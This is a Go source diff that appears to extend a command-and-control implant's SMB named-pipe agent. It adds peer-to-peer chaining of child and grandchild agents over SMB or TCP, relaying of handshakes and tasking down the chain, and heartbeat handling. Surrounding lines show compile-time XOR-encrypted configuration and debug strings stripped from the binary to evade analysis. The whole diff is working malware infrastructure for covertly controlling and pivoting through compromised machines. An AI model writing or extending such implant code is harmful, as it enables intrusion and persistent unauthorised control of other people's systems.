@@ -15,6 +15,15 @@ import (
 	"time"
 )
 
+// getPayloadKeys returns the keys in a payload map for debug logging
+func getPayloadKeys(m map[string]interface{}) []string {
+	keys := make([]string, 0, len(m))
+	for k := range m {
+		keys = append(keys, k)
+	}
+	return keys
+}
+
 // Configuration variables - will be replaced at compile time via -ldflags
 var (
 	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
@@ -194,7 +203,15 @@ func handleConnection(conn *PipeConnection, config map[string]string) {
 			handleServerData(conn, msgEnvelope.Payload)
 
 		case "handshake_response":
-			handleHandshakeResponse(conn, msgEnvelope.Payload)
+			handleHandshakeResponse(conn, rawMessage)
+
+		case "link_handshake_response":
+			// This is a forwarded handshake response for a child agent
+			handleLinkHandshakeResponse(messageData)
+
+		case "ping":
+			// Heartbeat from parent - respond with pong to keep connection alive
+			sendPong(conn)
 
 		case "disconnect":
 			return
@@ -261,17 +278,19 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 		resultManager.AddResult(result)
 	}
 
-	// Collect link data from child SMB agents (if any)
+	// Collect link data from child agents (SMB or TCP)
 	lm := GetLinkManager()
 	linkData := lm.GetOutboundData()
+	linkHandshake := lm.GetHandshakeData()
 	unlinkNotifications := lm.GetUnlinkNotifications()
 
 	hasResults := resultManager.HasResults()
 	hasLinkData := len(linkData) > 0
+	hasLinkHandshake := linkHandshake != nil
 	hasUnlinkNotifications := len(unlinkNotifications) > 0
 
 	// Send results back (including any link data from child agents)
-	if hasResults || hasLinkData || hasUnlinkNotifications {
+	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
 		results := resultManager.GetPendingResults()
 
 		payload := map[string]interface{}{
@@ -285,6 +304,11 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 		// Include link data from child agents (to be forwarded up the chain)
 		if hasLinkData {
 			payload["ld"] = linkData
+		}
+
+		// Include link handshake from child agents (via "lh" field)
+		if hasLinkHandshake {
+			payload["lh"] = linkHandshake
 		}
 
 		// Include unlink notifications from child agents
@@ -353,10 +377,47 @@ func sendPipeResponse(conn *PipeConnection, encryptedPayload string) error {
 	return conn.WriteMessage(respJSON)
 }
 
-func handleHandshakeResponse(conn *PipeConnection, payload string) {
+func handleHandshakeResponse(conn *PipeConnection, rawMessage []byte) {
 	// This is called when we receive a handshake response from the server
-	// The actual handling is done in the handshake.go performHandshake flow
-	// logDebug("Received handshake response")
+	// For the SMB agent's own handshake, performHandshake handles it directly
+	// But this function is called from the message loop for forwarded responses
+
+	// Check if there's an "lr" field for grandchildren that needs forwarding
+	var msg struct {
+		Type    string        `json:"type"`
+		Payload string        `json:"payload"`
+		LR      []interface{} `json:"lr"`
+	}
+
+	if err := json.Unmarshal(rawMessage, &msg); err != nil {
+		return
+	}
+
+	// If there's lr data, forward to our children
+	if len(msg.LR) > 0 {
+		processLinkHandshakeResponses(msg.LR)
+	}
+}
+
+// handleLinkHandshakeResponse handles forwarded handshake responses from parent
+// This is used when a grandchild agent's handshake response needs to pass through us
+func handleLinkHandshakeResponse(rawMessage []byte) {
+	// Parse the message to extract the lr field
+	var msg struct {
+		Type string        `json:"type"`
+		LR   []interface{} `json:"lr"`
+	}
+
+	if err := json.Unmarshal(rawMessage, &msg); err != nil {
+		return
+	}
+
+	if len(msg.LR) == 0 {
+		return
+	}
+
+	// Process the lr data - forward to our children
+	processLinkHandshakeResponses(msg.LR)
 }
 
 // logDebug removed to eliminate debug strings from binary
@@ -379,13 +440,22 @@ func processLinkCommands(linkCmds []interface{}) {
 
 		routingID, _ := cmdMap["r"].(string)
 		payload, _ := cmdMap["p"].(string)
+		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
+		transformed, _ := cmdMap["t"].(bool)
 
 		if routingID == "" || payload == "" {
 			continue
 		}
 
+		// Check link state before forwarding
+		_, exists := lm.GetLink(routingID)
+		if !exists {
+			continue
+		}
+
 		// Forward to the linked agent AND WAIT for response
-		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, 30*time.Second)
+		// If transformed=true, payload is base64-encoded transformed data - send as raw bytes
+		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, transformed, 30*time.Second)
 		if err != nil {
 			continue
 		}
@@ -397,7 +467,8 @@ func processLinkCommands(linkCmds []interface{}) {
 	}
 }
 
-// processLinkHandshakeResponses forwards handshake responses from parent to child SMB agents
+// processLinkHandshakeResponses forwards handshake responses from parent to child agents
+// The response is sent as handshake_response which the child can use directly OR forward to grandchildren
 func processLinkHandshakeResponses(linkResps []interface{}) {
 	lm := GetLinkManager()
 
@@ -420,10 +491,12 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 			continue
 		}
 
-		// Send handshake response to child SMB agent
-		message := map[string]string{
+		// Send handshake_response to the child
+		// Include the full lr data so the child can forward to grandchildren if needed
+		message := map[string]interface{}{
 			"type":    "handshake_response",
 			"payload": payload,
+			"lr":      []interface{}{respMap}, // Include lr for forwarding to grandchildren
 		}
 
 		msgJSON, err := json.Marshal(message)
@@ -434,5 +507,21 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 		link.mu.Lock()
 		writeMessage(link.Conn, msgJSON)
 		link.mu.Unlock()
+
+		// Brief pause to let child process handshake before commands arrive
+		time.Sleep(100 * time.Millisecond)
 	}
+}
+
+// sendPong sends a pong response to the parent agent
+func sendPong(conn *PipeConnection) {
+	response := map[string]string{
+		"type": "pong",
+	}
+	respJSON, err := json.Marshal(response)
+	if err != nil {
+		return
+	}
+
+	conn.WriteMessage(respJSON)
 }
